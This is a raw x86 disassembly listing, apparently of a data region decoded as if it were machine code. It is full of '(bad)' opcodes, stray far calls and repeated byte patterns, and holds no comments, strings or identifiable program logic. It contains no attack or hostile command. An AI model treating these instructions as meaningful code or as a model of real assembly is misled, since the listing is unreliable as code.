  43da40:	add    BYTE PTR [edx-0x1],al
  43da43:	add    BYTE PTR [eax],al
  43da45:	inc    DWORD PTR ds:[eax]
  43da48:	add    BYTE PTR [edx],dh
  43da4a:	inc    DWORD PTR [eax]
  43da4c:	add    BYTE PTR [esi],ch
  43da4e:	inc    DWORD PTR [eax]
  43da50:	add    BYTE PTR [edx-0x1],al
  43da53:	add    BYTE PTR [eax],al
  43da55:	inc    edx
  43da56:	inc    DWORD PTR [eax]
  43da58:	add    BYTE PTR [edi+edi*8],ch
  43da5b:	add    BYTE PTR [eax],al
  43da5d:	inc    esp
  43da5e:	inc    DWORD PTR [eax]
  43da60:	add    BYTE PTR [ecx-0x1],cl
  43da63:	add    BYTE PTR [eax],al
  43da65:	inc    edi
  43da66:	inc    DWORD PTR [eax]
  43da68:	add    BYTE PTR [edx-0x1],cl
  43da6b:	add    BYTE PTR [eax],al
  43da6d:	jbe    0x43da6e
  43da6f:	add    BYTE PTR [eax],al
  43da71:	mov    ds:0xd43015ff,eax
  43da76:	call   FWORD PTR [ebx-0x12]
  43da79:	icebp  
  43da7a:	dec    DWORD PTR [esi-0x1b]
  43da7d:	out    dx,al
  43da7e:	call   FWORD PTR [esp+ebx*8-0x12]
  43da82:	jmp    FWORD PTR [ecx]
  43da84:	test   dl,bl
  43da86:	push   DWORD PTR [edi+ebx*4]
  43da89:	aam    0xff
  43da8b:	xor    ecx,DWORD PTR [edi+0x7030ffc4]
  43da91:	mov    ch,0xff
  43da93:	sub    esp,DWORD PTR [edx-0x53]
  43da96:	dec    DWORD PTR [esi+edi*4-0x20]
  43da9a:	inc    DWORD PTR [edi-0x49]
  43da9d:	(bad)  
  43da9f:	inc    esi
  43daa0:	mov    ss,ecx
  43daa2:	inc    DWORD PTR [edi-0x75]
  43daa5:	mov    edi,0xc78234ff
  43daaa:	call   FWORD PTR [ebx-0x5a]
  43daad:	loope  0x43daae
  43daaf:	mov    bh,0xdd
  43dab1:	lock dec DWORD PTR [ecx-0x66]
  43dab5:	in     eax,0xff
  43dab7:	add    al,BYTE PTR [esi]
  43dab9:	mov    ecx,0xb00000ff
  43dabe:	inc    DWORD PTR [ebp+0x59]
  43dac1:	(bad)  
  43dac3:	(bad)  
  43dac4:	std    
  43dac5:	stc    
  43dac6:	inc    DWORD PTR [eax]
  43dac8:	push   cs
  43dac9:	(bad)  
  43dacb:	add    BYTE PTR [eax],al
  43dacd:	in     eax,0xff
  43dacf:	mov    ds:0x6bffe6ce,eax
  43dad4:	(bad)  
  43dad6:	call   FWORD PTR [esi+esi*4-0x24]
  43dada:	call   DWORD PTR [esi-0x5b]
  43dadd:	aam    0xff
  43dadf:	imul   eax,ebp,0xe688ffe2
  43dae5:	repnz jmp FWORD PTR [esi-0x39]
  43dae9:	jecxz  0x43daea
  43daeb:	pop    ecx
  43daec:	test   eax,0xae58ffd2
  43daf1:	aam    0xff
  43daf3:	push   edx
  43daf4:	lods   al,BYTE PTR ds:[esi]
  43daf5:	(bad)  
  43daf6:	call   FWORD PTR [esi+edi*4-0x20]
  43dafa:	jmp    DWORD PTR [edx-0x2a]
  43dafd:	call   0xcfd30701
  43db02:	(bad)  
  43db03:	cmp    ch,BYTE PTR [ebx-0x1e630021]
  43db09:	lock jmp DWORD PTR [esi]
  43db0c:	shl    bl,cl
  43db0e:	inc    ebx
  43db10:	repnz clc 
  43db12:	(bad)  
  43db13:	fdivp  st(7),st
  43db15:	cld    
  43db16:	inc    DWORD PTR [ecx+0x7b]
  43db19:	repz inc DWORD PTR [eax]
  43db1c:	add    BYTE PTR [edi+0x6f0000ff],ch
  43db22:	inc    DWORD PTR [eax]
  43db24:	add    BYTE PTR [ecx-0x1],dl
  43db27:	add    BYTE PTR [eax],al
  43db29:	xor    edi,edi
  43db2b:	add    BYTE PTR [eax],al
  43db2d:	and    bh,bh
  43db2f:	add    BYTE PTR [eax],al
  43db31:	push   ss
  43db32:	inc    DWORD PTR [eax]
  43db34:	add    BYTE PTR [edx],bl
  43db36:	inc    DWORD PTR [eax]
  43db38:	add    BYTE PTR [ebx],bl
  43db3a:	inc    DWORD PTR [eax]
  43db3c:	add    BYTE PTR [ebx],bl
  43db3e:	inc    DWORD PTR [eax]
  43db40:	add    BYTE PTR ds:0x130000ff,dl
  43db46:	inc    DWORD PTR [eax]
  43db48:	add    BYTE PTR [ebx],dl
  43db4a:	inc    DWORD PTR [eax]
  43db4c:	add    BYTE PTR [edi+edi*8],bl
  43db4f:	add    BYTE PTR [eax],al
  43db51:	and    edi,edi
  43db53:	add    BYTE PTR [eax],al
  43db55:	cmp    bh,bh
  43db57:	add    BYTE PTR [eax],al
  43db59:	push   esi
  43db5a:	inc    DWORD PTR [eax]
  43db5c:	add    BYTE PTR [ebx-0x389fb601],ah
  43db62:	call   FWORD PTR [eax+0x71]
  43db65:	int    0xff
  43db67:	sbb    DWORD PTR [ebp-0x214c001e],0xfcb8ffec
  43db71:	repz jmp DWORD PTR [edi-0x37000d03]
  43db78:	lock jmp 0x1bff:0xd5c899ff
  43db80:	(bad)  
  43db82:	(bad)  
  43db83:	jnp    0x43db78
  43db85:	call   0xd0fc4289
  43db8a:	jmp    FWORD PTR [ebx]
  43db8c:	cmp    DWORD PTR [edi-0x2e49aa01],0xffffffff
  43db93:	cs test eax,0xb432ffdf
  43db99:	hlt    
  43db9a:	(bad)  
  43db9b:	jg     0x43db66
  43db9d:	(bad)  
  43db9f:	jb     0x43db64
  43dba1:	fdivp  st(7),st
  43dba3:	jle    0x43db76
  43dba5:	loop   0x43dba6
  43dba7:	cmp    cl,al
  43dba9:	(bad)  
  43dbab:	inc    esi
  43dbac:	enter  0xffdb,0x25
  43dbb0:	mov    ds:0xb34dffc7,al
  43dbb5:	retf   
  43dbb6:	jmp    edi
  43dbb8:	(bad)  
  43dbb9:	cld    
  43dbba:	jmp    DWORD PTR [edi-0x64]
  43dbbd:	in     eax,0xff
  43dbbf:	add    BYTE PTR [eax],al
  43dbc1:	(bad)  
  43dbc2:	inc    DWORD PTR [eax]
  43dbc4:	add    BYTE PTR [edx-0x60ffff01],ch
  43dbca:	inc    DWORD PTR [eax]
  43dbcc:	add    BYTE PTR [ebx-0x207ca301],ch
  43dbd2:	call   FWORD PTR [ebx-0x7f00161e]
  43dbd8:	shl    cl,1
  43dbda:	inc    DWORD PTR [edx+0x63ffd0ba]
  43dbe0:	mov    dl,0xc8
  43dbe2:	dec    DWORD PTR [edi-0x50]
  43dbe5:	int    0xff
  43dbe7:	inc    ebx
  43dbe8:	test   al,0xd1
  43dbea:	dec    DWORD PTR [edi-0x4c]
  43dbed:	(bad)  
  43dbef:	inc    eax
  43dbf0:	mov    ds:0xc888ffd6,eax
  43dbf5:	loopne 0x43dbf6
  43dbf7:	imul   esi,DWORD PTR [ebx-0x3c860022],0xef89ffe9
  43dc01:	clc    
  43dc02:	call   FWORD PTR [edi]
  43dc04:	fsub   st(0),st
  43dc06:	call   DWORD PTR [ebx-0x42]
  43dc09:	(bad)  
  43dc0b:	ja     0x43dbdc
  43dc0d:	in     al,0xff
  43dc0f:	pop    ds
  43dc10:	xchg   ecx,eax
  43dc11:	(bad)  
  43dc12:	call   FWORD PTR [esp+edi*4]
  43dc15:	retf   0xe5ff
  43dc18:	(bad)  
  43dc19:	sti    
  43dc1a:	inc    DWORD PTR [eax]
  43dc1c:	add    al,ah
  43dc1e:	inc    DWORD PTR [eax]
  43dc20:	add    BYTE PTR [ebp+0x740000ff],ah
  43dc26:	inc    DWORD PTR [eax]
  43dc28:	add    BYTE PTR [edi+edi*8+0x0],dl
  43dc2c:	add    BYTE PTR [ebx],bh
  43dc2e:	inc    DWORD PTR [eax]
  43dc30:	add    BYTE PTR [ecx],bh
  43dc32:	inc    DWORD PTR [eax]
  43dc34:	add    BYTE PTR [ebx],dh
  43dc36:	inc    DWORD PTR [eax]
  43dc38:	add    BYTE PTR [ecx],dh
  43dc3a:	inc    DWORD PTR [eax]
  43dc3c:	add    BYTE PTR [edi],ah
  43dc3e:	inc    DWORD PTR [eax]
  43dc40:	add    BYTE PTR [ebx],ah
  43dc42:	inc    DWORD PTR [eax]
  43dc44:	add    BYTE PTR [esi],dh
  43dc46:	inc    DWORD PTR [eax]
  43dc48:	add    BYTE PTR [esi],dh
  43dc4a:	inc    DWORD PTR [eax]
  43dc4c:	add    BYTE PTR [edi+edi*8],dh
  43dc4f:	add    BYTE PTR [eax],al
  43dc51:	xor    edi,edi
  43dc53:	add    BYTE PTR [eax],al
  43dc55:	inc    DWORD PTR es:[eax]
  43dc58:	add    BYTE PTR [ebx],ah
  43dc5a:	inc    DWORD PTR [eax]
  43dc5c:	add    BYTE PTR [eax],dh
  43dc5e:	inc    DWORD PTR [eax]
  43dc60:	add    BYTE PTR [ecx-0x1],al
  43dc63:	add    BYTE PTR [eax],al
  43dc65:	cmp    edi,edi
  43dc67:	add    BYTE PTR [eax],al
  43dc69:	push   ecx
  43dc6a:	inc    DWORD PTR [eax]
  43dc6c:	add    BYTE PTR [ecx-0x1],ch
  43dc6f:	add    BYTE PTR [eax],al
  43dc71:	sahf   
  43dc72:	inc    DWORD PTR [ecx]
  43dc74:	add    bl,cl
  43dc76:	dec    DWORD PTR [ebx+ebx*8-0x10]
  43dc7a:	call   FWORD PTR [esi-0x1]
  43dc7d:	jmp    0xcff:0xdfc51aff
  43dc84:	push   edi
  43dc85:	lods   eax,DWORD PTR ds:[esi]
  43dc86:	inc    DWORD PTR [eax]
  43dc88:	ss scas al,BYTE PTR es:[edi]
  43dc8a:	jmp    DWORD PTR [esi]
  43dc8c:	pushf  
  43dc8d:	sar    edi,cl
  43dc8f:	ss xchg edx,eax
  43dc91:	leave  
  43dc92:	push   DWORD PTR [esi+edi*2]
  43dc95:	mov    ebp,0xd6b53fff
  43dc9a:	dec    DWORD PTR [edx-0x48]
  43dc9d:	loop   0x43dc9e
  43dc9f:	xor    al,0x5b
  43dca1:	lods   al,BYTE PTR ds:[esi]
  43dca2:	push   DWORD PTR [ebx+esi*2]
  43dca5:	mov    ebp,0xd58c30ff
  43dcaa:	jmp    DWORD PTR [edx-0x2f]
  43dcad:	lock dec DWORD PTR [ecx+edi*4+0x908ffef]
  43dcb5:	sar    bh,0x0
  43dcb8:	add    BYTE PTR [ebx-0x75ffff01],bl
  43dcbe:	inc    DWORD PTR [eax]
  43dcc0:	add    BYTE PTR [edx-0x33aab401],ah
  43dcc6:	dec    DWORD PTR [eax+0xfff8c3]
  43dccc:	add    bh,bl
  43dcce:	(bad)  
  43dccf:	jg     0x43dc6f
  43dcd1:	out    0xff,eax
  43dcd3:	mov    ds:0x52fff1fc,al
  43dcd8:	mov    dl,0xd9
  43dcda:	call   FWORD PTR [ecx-0x59]
  43dcdd:	aad    0xff
  43dcdf:	push   esi
  43dce0:	scas   al,BYTE PTR es:[edi]
  43dce1:	xlat   BYTE PTR ds:[ebx]
  43dce2:	jmp    FWORD PTR [ecx-0x36]
  43dce5:	in     eax,0xff
  43dce7:	pop    ebp
  43dce8:	mov    esp,0xa254ffdd
  43dced:	iret   
  43dcee:	jmp    DWORD PTR [edi+esi*4-0x25]
  43dcf2:	call   DWORD PTR [eax-0x56]
  43dcf5:	(bad)  
  43dcf6:	call   FWORD PTR [ecx-0x4d]
  43dcf9:	(bad)  
  43dcfb:	pusha  
  43dcfc:	(bad)  
  43dcfd:	call   0xbbae1101
  43dd02:	call   FWORD PTR [ebx]
  43dd04:	push   eax
  43dd05:	mov    al,0xff
  43dd07:	adc    esi,DWORD PTR [ebx-0x38]
  43dd0a:	call   DWORD PTR [edx]
  43dd0c:	jb     0x43dce1
  43dd0e:	inc    DWORD PTR [ebx]
  43dd10:	mov    ds:0xeabaffec,eax
  43dd15:	out    dx,al
  43dd16:	jmp    FWORD PTR [edi+0x1fffdff]
  43dd1c:	or     edx,ebx
  43dd1e:	inc    DWORD PTR [eax]
  43dd20:	add    BYTE PTR [ebx+0x650000ff],cl
  43dd26:	inc    DWORD PTR [eax]
  43dd28:	add    BYTE PTR [edi+edi*8],bh
  43dd2b:	add    BYTE PTR [eax],al
  43dd2d:	sbb    edi,edi
  43dd2f:	add    BYTE PTR [eax],al
  43dd31:	and    edi,edi
  43dd33:	add    BYTE PTR [eax],al
  43dd35:	and    bh,bh
  43dd37:	add    BYTE PTR [eax],al
  43dd39:	pop    ss
  43dd3a:	inc    DWORD PTR [eax]
  43dd3c:	add    BYTE PTR [edx],dl
  43dd3e:	inc    DWORD PTR [eax]
  43dd40:	add    BYTE PTR [esi],dl
  43dd42:	inc    DWORD PTR [eax]
  43dd44:	add    BYTE PTR [ebx],dl
  43dd46:	inc    DWORD PTR [eax]
  43dd48:	add    BYTE PTR [edi],dl
  43dd4a:	inc    DWORD PTR [eax]
  43dd4c:	add    BYTE PTR [edx],ah
  43dd4e:	inc    DWORD PTR [eax]
  43dd50:	add    BYTE PTR [eax],dh
  43dd52:	inc    DWORD PTR [eax]
  43dd54:	add    BYTE PTR [edi+edi*8+0x0],al
  43dd58:	add    BYTE PTR [esi-0x1],ch
  43dd5b:	sbb    DWORD PTR [ecx],esi
  43dd5d:	sar    edi,1
  43dd5f:	fdivp  st(7),st
  43dd61:	repz dec esi
  43dd64:	repnz out dx,eax
  43dd66:	call   esp
  43dd68:	stc    
  43dd69:	out    dx,eax
  43dd6a:	(bad)  
  43dd6b:	mov    eax,0x89ffe7f0
  43dd70:	(bad)  
  43dd71:	repnz jmp FWORD PTR [ecx]
  43dd74:	xchg   esi,eax
  43dd75:	sar    bh,1
  43dd77:	jns    0x43dd64
  43dd79:	(bad)  
  43dd7a:	jmp    FWORD PTR [eax-0x36]
  43dd7d:	mov    dh,0xff
  43dd7f:	add    BYTE PTR [eax-0x2d7c006e],dl
  43dd85:	(bad)  
  43dd87:	push   esi
  43dd88:	enter  0xffde,0x2b
  43dd8c:	cmp    BYTE PTR [eax-0x528cd401],0xff
  43dd93:	pop    ds
  43dd94:	popf   
  43dd95:	enter  0x28ff,0x9d
  43dd99:	jmp    0xdf116c9d
  43dd9e:	call   FWORD PTR [ecx+0x55ffe4d4]
  43dda4:	shl    eax,0xff
  43dda7:	and    eax,0x48ffdab2
  43ddac:	enter  0xffdb,0x22
  43ddb0:	stos   DWORD PTR es:[edi],eax
  43ddb1:	retf   
  43ddb2:	push   DWORD PTR [esi+ecx*8-0x29]
  43ddb6:	(bad)  
  43ddb7:	fdivp  st(7),st
  43ddb9:	cmc    
  43ddba:	inc    DWORD PTR [ecx]
  43ddbc:	add    ebx,eax
  43ddbe:	inc    DWORD PTR [eax]
  43ddc0:	add    BYTE PTR [edx-0x6bffff01],ch
  43ddc6:	inc    DWORD PTR [eax]
  43ddc8:	add    BYTE PTR [edi+edi*8-0x590000],cl
  43ddcf:	jo     0x43dd6e
  43ddd1:	out    0xff,eax
  43ddd3:	mov    ss,esp
  43ddd5:	jecxz  0x43ddd6
  43ddd7:	push   ebx
  43ddd8:	xchg   ecx,eax
  43ddd9:	ret    
  43ddda:	jmp    FWORD PTR [edi-0x56]
  43dddd:	sar    bh,cl
  43dddf:	dec    ebp
  43dde0:	cdq    
  43dde1:	enter  0x25ff,0x81
  43dde5:	mov    ebp,0xa05000ff
  43ddea:	jmp    FWORD PTR [esi]
  43ddec:	xchg   ebp,eax
  43dded:	(bad)  
  43ddee:	dec    DWORD PTR [ebx-0x54]
  43ddf1:	xlat   BYTE PTR ds:[ebx]
  43ddf2:	call   DWORD PTR [eax+ebp*4-0x2b]
  43ddf6:	dec    DWORD PTR [ebx+eax*8-0x5cbb0023]
  43ddfd:	jecxz  0x43ddfe
  43ddff:	or     al,0xec
  43de02:	call   FWORD PTR [edx-0x3f]
  43de05:	in     al,0xff
  43de07:	daa    
  43de08:	mov    ds:0xd9a2ffd0,eax
  43de0d:	call   0xcde91a11
  43de12:	inc    DWORD PTR [eax]
  43de14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43de15:	sar    edi,0xd1
  43de18:	(bad)  
  43de19:	stc    
  43de1a:	inc    DWORD PTR [eax]
  43de1c:	add    bh,al
  43de1e:	inc    DWORD PTR [eax]
  43de20:	add    BYTE PTR [ecx+0x690000ff],bl
  43de26:	inc    DWORD PTR [eax]
  43de28:	add    BYTE PTR [edi-0x1],al
  43de2b:	add    BYTE PTR [eax],al
  43de2d:	inc    eax
  43de2e:	inc    DWORD PTR [eax]
  43de30:	add    BYTE PTR [edx],bh
  43de32:	inc    DWORD PTR [eax]
  43de34:	add    BYTE PTR [ecx],dh
  43de36:	inc    DWORD PTR [eax]
  43de38:	add    BYTE PTR [eax],bh
  43de3a:	inc    DWORD PTR [eax]
  43de3c:	add    BYTE PTR [edx],dh
  43de3e:	inc    DWORD PTR [eax]
  43de40:	add    BYTE PTR [esi],ah
  43de42:	inc    DWORD PTR [eax]
  43de44:	add    BYTE PTR [esi],dh
  43de46:	inc    DWORD PTR [eax]
  43de48:	add    BYTE PTR [edi+edi*8],ch
  43de4b:	add    BYTE PTR [eax],al
  43de4d:	inc    DWORD PTR cs:[eax]
  43de50:	add    BYTE PTR [edi],bh
  43de52:	inc    DWORD PTR [eax]
  43de54:	add    BYTE PTR [eax],bh
  43de56:	inc    DWORD PTR [eax]
  43de58:	add    BYTE PTR [ebx],dh
  43de5a:	inc    DWORD PTR [eax]
  43de5c:	add    BYTE PTR [esi],ah
  43de5e:	inc    DWORD PTR [eax]
  43de60:	add    BYTE PTR [edi+edi*8],dh
  43de63:	add    BYTE PTR [eax],al
  43de65:	xor    bh,bh
  43de67:	add    BYTE PTR [eax],al
  43de69:	inc    ebx
  43de6a:	inc    DWORD PTR [eax]
  43de6c:	add    BYTE PTR [ebx-0x1],dl
  43de6f:	add    BYTE PTR [eax],al
  43de71:	ja     0x43de72
  43de73:	add    BYTE PTR [eax],al
  43de75:	mov    edx,0xf2dd50ff
  43de7a:	push   DWORD PTR [edx+0x75ffedff]
  43de80:	retf   0xffec
  43de83:	outs   dx,DWORD PTR ds:[esi]
  43de84:	mov    esi,0xb35fffe7
  43de89:	(bad)  
  43de8b:	das    
  43de8c:	jl     0x43de54
  43de8e:	jmp    FWORD PTR [esi]
  43de90:	imul   esi,DWORD PTR [eax-0x468fcf01],0xd8ac41ff
  43de9a:	inc    DWORD PTR [ebp-0x65]
  43de9d:	iret   
  43de9e:	jmp    FWORD PTR [edi]
  43dea0:	pop    edx
  43dea1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43dea2:	push   DWORD PTR [eax]
  43dea4:	popa   
  43dea5:	scas   eax,DWORD PTR es:[edi]
  43dea6:	jmp    FWORD PTR [edx]
  43dea8:	jge    0x43de70
  43deaa:	call   FWORD PTR [edi]
  43deac:	xchg   ecx,eax
  43dead:	ret    
  43deae:	inc    DWORD PTR [edi+0x64]
  43deb1:	fdiv   st(7),st
  43deb3:	add    BYTE PTR [eax],al
  43deb5:	stos   DWORD PTR es:[edi],eax
  43deb6:	inc    DWORD PTR [eax]
  43deb8:	add    BYTE PTR [edi+edi*8-0x8c0000],al
  43debf:	add    BYTE PTR [eax],al
  43dec1:	jae    0x43dec2
  43dec3:	add    BYTE PTR [eax],al
  43dec5:	xchg   edi,edi
  43dec7:	adc    DWORD PTR [esi],esp
  43dec9:	popf   
  43deca:	inc    DWORD PTR [eax]
  43decc:	add    al,dl
  43dece:	inc    DWORD PTR [eax+0x6a]
  43ded1:	jmp    0x43ded2
  43ded3:	scas   eax,DWORD PTR es:[edi]
  43ded4:	push   esi
  43ded6:	call   FWORD PTR [ebx-0x31]
  43ded9:	in     eax,0xff
  43dedb:	push   edx
  43dedc:	mov    al,ds:0xb960ffd0
  43dee1:	loopne 0x43dee2
  43dee3:	dec    ebx
  43dee4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43dee5:	aad    0xff
  43dee7:	push   edx
  43dee8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43dee9:	xlat   BYTE PTR ds:[ebx]
  43deea:	call   FWORD PTR [eax-0x54]
  43deed:	xlat   BYTE PTR ds:[ebx]
  43deee:	inc    DWORD PTR [ebx-0x76]
  43def1:	int3   
  43def2:	dec    DWORD PTR [esi-0x5f]
  43def5:	aad    0xff
  43def7:	dec    edi
  43def8:	mov    ebp,0xc558ffde
  43defd:	loop   0x43defe
  43deff:	inc    ebp
  43df00:	xchg   esi,eax
  43df01:	int    0xff
  43df03:	xor    BYTE PTR [ebx+0x5822ffd4],bl
  43df09:	mov    ebp,0xca7325ff
  43df0e:	jmp    DWORD PTR [edx]
  43df10:	iret   
  43df11:	lock (bad) 
  43df13:	cmp    eax,0xe0ffde85
  43df18:	(bad)  
  43df19:	cld    
  43df1a:	jmp    DWORD PTR [ebx-0x75]
  43df1d:	idiv   edi
  43df1f:	add    BYTE PTR [eax],al
  43df21:	stos   DWORD PTR es:[edi],eax
  43df22:	inc    DWORD PTR [eax]
  43df24:	add    BYTE PTR [edx-0x1],dh
  43df27:	add    BYTE PTR [eax],al
  43df29:	inc    ebp
  43df2a:	inc    DWORD PTR [eax]
  43df2c:	add    BYTE PTR [ebx],ch
  43df2e:	inc    DWORD PTR [eax]
  43df30:	add    BYTE PTR ds:0x190000ff,ah
  43df36:	inc    DWORD PTR [eax]
  43df38:	add    BYTE PTR [ebx],dl
  43df3a:	inc    DWORD PTR [eax]
  43df3c:	add    BYTE PTR [esi],dl
  43df3e:	inc    DWORD PTR [eax]
  43df40:	add    BYTE PTR [ecx],bl
  43df42:	inc    DWORD PTR [eax]
  43df44:	add    BYTE PTR [ebx],dl
  43df46:	inc    DWORD PTR [eax]
  43df48:	add    BYTE PTR [esi],dl
  43df4a:	inc    DWORD PTR [eax]
  43df4c:	add    BYTE PTR [esi],ah
  43df4e:	inc    DWORD PTR [eax]
  43df50:	add    BYTE PTR [edi+edi*8],dh
  43df53:	add    BYTE PTR [eax],al
  43df55:	push   edx
  43df56:	inc    DWORD PTR [eax]
  43df58:	add    BYTE PTR [eax-0x1],bh
  43df5b:	and    eax,0xdbffcb35
  43df60:	(bad)  
  43df61:	in     al,dx
  43df62:	(bad)  
  43df63:	mov    esp,0x8fffe7f5
  43df68:	in     eax,0xdc
  43df6a:	(bad)  
  43df6b:	jg     0x43df49
  43df6d:	fdiv   st(7),st
  43df6f:	ja     0x43df46
  43df71:	sar    edi,cl
  43df73:	inc    esp
  43df74:	mov    bh,0xd7
  43df76:	call   DWORD PTR [ebp-0x16]
  43df79:	sti    
  43df7a:	push   DWORD PTR [edx+0xffe9f1]
  43df80:	fwait
  43df81:	mov    ecx,0xceb071ff
  43df86:	inc    DWORD PTR [esi-0x70]
  43df89:	mov    ebx,0xd3a537ff
  43df8e:	jmp    FWORD PTR [esi]
  43df90:	test   ah,al
  43df92:	jmp    DWORD PTR [edx-0x51]
  43df95:	leave  
  43df96:	push   DWORD PTR [ecx]
  43df98:	xchg   esi,eax
  43df99:	ret    0x37ff
  43df9c:	xchg   eax,eax
  43df9e:	call   DWORD PTR [edi+ecx*8-0x4cc50021]
  43dfa5:	fdivr  st,st(7)
  43dfa7:	pop    ds
  43dfa8:	test   al,0xd6
  43dfaa:	call   FWORD PTR [edx]
  43dfac:	ins    DWORD PTR es:[edi],dx
  43dfad:	stos   BYTE PTR es:[edi],al
  43dfae:	inc    DWORD PTR [eax]
  43dfb0:	ds test edi,edi
  43dfb3:	xor    BYTE PTR [ebp-0x3d790031],bh
  43dfb9:	jmp    0x43dfba
  43dfbb:	add    BYTE PTR [eax],al
  43dfbd:	sar    bh,0x0
  43dfc0:	add    BYTE PTR [ecx-0x67ffff01],bl
  43dfc6:	inc    DWORD PTR [eax]
  43dfc8:	add    BYTE PTR [edx-0x64ffff01],al
  43dfce:	jmp    DWORD PTR [edi-0x6f]
  43dfd1:	jecxz  0x43dfd2
  43dfd3:	mov    cl,cl
  43dfd5:	fdivp  st(7),st
  43dfd7:	inc    eax
  43dfd8:	jl     0x43df98
  43dfda:	call   FWORD PTR [eax-0x76]
  43dfdd:	retf   
  43dfde:	call   FWORD PTR [esi-0x76]
  43dfe1:	ret    
  43dfe2:	call   FWORD PTR [edx]
  43dfe4:	pop    esp
  43dfe5:	scas   al,BYTE PTR es:[edi]
  43dfe6:	dec    DWORD PTR [ecx]
  43dfe8:	push   ebx
  43dfe9:	scas   al,BYTE PTR es:[edi]
  43dfea:	call   FWORD PTR [edi-0x67]
  43dfed:	into   
  43dfee:	call   DWORD PTR [esi-0x58]
  43dff1:	sar    edi,1
  43dff3:	lods   eax,DWORD PTR ds:[esi]
  43dff5:	xlat   BYTE PTR ds:[ebx]
  43dff6:	dec    DWORD PTR [ebx+0x4effe0c7]
  43dffc:	scas   eax,DWORD PTR es:[edi]
  43dffd:	aad    0xff
  43dfff:	inc    edx
  43e000:	mov    cl,0xdc
  43e002:	dec    DWORD PTR [edx-0x2f]
  43e005:	out    0xff,eax
  43e007:	xor    BYTE PTR [ebp-0x5d9c003c],cl
  43e00d:	aam    0xff
  43e00f:	(bad)  
  43e010:	shr    ebx,cl
  43e012:	inc    DWORD PTR [esi+ebx*8]
  43e015:	(bad)  
  43e018:	(bad)  
  43e019:	cli    
  43e01a:	inc    DWORD PTR [eax]
  43e01c:	add    BYTE PTR [esi-0x74ffff01],ch
  43e022:	inc    DWORD PTR [eax]
  43e024:	add    BYTE PTR [edi-0x1],bl
  43e027:	add    BYTE PTR [eax],al
  43e029:	aas    
  43e02a:	inc    DWORD PTR [eax]
  43e02c:	add    BYTE PTR ds:0x2e0000ff,dh
  43e032:	inc    DWORD PTR [eax]
  43e034:	add    BYTE PTR [edx],dh
  43e036:	inc    DWORD PTR [eax]
  43e038:	add    BYTE PTR ds:0x3d0000ff,dh
  43e03e:	inc    DWORD PTR [eax]
  43e040:	add    BYTE PTR [edx],bh
  43e042:	inc    DWORD PTR [eax]
  43e044:	add    BYTE PTR [ecx],bh
  43e046:	inc    DWORD PTR [eax]
  43e048:	add    BYTE PTR [esi],ch
  43e04a:	inc    DWORD PTR [eax]
  43e04c:	add    BYTE PTR [edi+edi*8],ah
  43e04f:	add    BYTE PTR [eax],al
  43e051:	cmp    edi,edi
  43e053:	add    BYTE PTR [eax],al
  43e055:	sub    bh,bh
  43e057:	add    BYTE PTR [eax],al
  43e059:	xor    bh,bh
  43e05b:	add    BYTE PTR [eax],al
  43e05d:	xor    eax,0x3b0000ff
  43e062:	inc    DWORD PTR [eax]
  43e064:	add    BYTE PTR [edx],dh
  43e066:	inc    DWORD PTR [eax]
  43e068:	add    BYTE PTR [edi],dh
  43e06a:	inc    DWORD PTR [eax]
  43e06c:	add    BYTE PTR [ebx-0x1],bl
  43e06f:	add    BYTE PTR [eax],al
  43e071:	jo     0x43e072
  43e073:	add    BYTE PTR [eax],al
  43e075:	cdq    
  43e076:	push   DWORD PTR [edi-0x5]
  43e079:	idiv   edi
  43e07b:	(bad)  
  43e07e:	jmp    FWORD PTR [edi]
  43e080:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e081:	out    dx,eax
  43e082:	inc    DWORD PTR [esp+ebp*2-0x42]
  43e086:	(bad)  
  43e087:	imul   ebp,DWORD PTR ds:[edi-0x387db701],0xa95128ff
  43e092:	call   FWORD PTR [eax]
  43e094:	xor    eax,DWORD PTR [eax-0x4f96d101]
  43e09a:	push   DWORD PTR [edi]
  43e09c:	nop
  43e09d:	sar    bh,cl
  43e09f:	sub    dl,BYTE PTR [ebp-0x56]
  43e0a2:	jmp    DWORD PTR ds:0x26ff893e
  43e0a8:	jae    0x43e068
  43e0aa:	jmp    FWORD PTR [ebx]
  43e0ac:	xor    DWORD PTR [edi+edi*8-0x22a4ce],0xff9e0100
  43e0b7:	add    BYTE PTR [eax],al
  43e0b9:	jns    0x43e0ba
  43e0bb:	add    BYTE PTR [eax],al
  43e0bd:	popa   
  43e0be:	inc    DWORD PTR [eax]
  43e0c0:	add    BYTE PTR [ebx-0x1],dl
  43e0c3:	add    BYTE PTR [eax],al
  43e0c5:	popa   
  43e0c6:	inc    DWORD PTR [eax]
  43e0c8:	add    BYTE PTR [edi+edi*8+0x0],bh
  43e0cc:	add    BYTE PTR [edi+edi*8-0x38f9ff],bl
  43e0d3:	push   0xa1ffd5ad
  43e0d8:	push   ebx
  43e0da:	call   DWORD PTR [ebp+ebx*4-0x34]
  43e0de:	jmp    DWORD PTR [edi+edi*4-0x20]
  43e0e2:	call   FWORD PTR [edi-0x18]
  43e0e5:	out    dx,eax
  43e0e6:	dec    DWORD PTR [edi-0x5e]
  43e0e9:	(bad)  
  43e0ea:	inc    DWORD PTR [edx-0x7c]
  43e0ed:	(bad)  
  43e0ee:	inc    DWORD PTR [ebx-0x69]
  43e0f1:	sar    bh,cl
  43e0f3:	dec    eax
  43e0f4:	xchg   edx,eax
  43e0f5:	sar    bh,1
  43e0f7:	dec    esi
  43e0f8:	int3   
  43e0f9:	out    0xff,eax
  43e0fb:	sub    DWORD PTR [edx-0x56bf0038],eax
  43e101:	aam    0xff
  43e103:	aaa    
  43e104:	xchg   esi,eax
  43e105:	sar    bh,1
  43e107:	and    dl,BYTE PTR [esi-0x3e]
  43e10a:	jmp    DWORD PTR [ebx]
  43e10c:	jnp    0x43e0d5
  43e10e:	jmp    DWORD PTR [edi]
  43e110:	fdiv   st,st(4)
  43e112:	jmp    DWORD PTR [eax]
  43e114:	pop    eax
  43e115:	sar    edi,1
  43e117:	xlat   BYTE PTR ds:[ebx]
  43e118:	(bad)  
  43e119:	idiv   bh
  43e11b:	enter  0xffff,0xff
  43e11f:	add    BYTE PTR [ecx],al
  43e121:	xchg   ebx,eax
  43e122:	inc    DWORD PTR [eax]
  43e124:	add    BYTE PTR [ecx+0x580000ff],cl
  43e12a:	inc    DWORD PTR [eax]
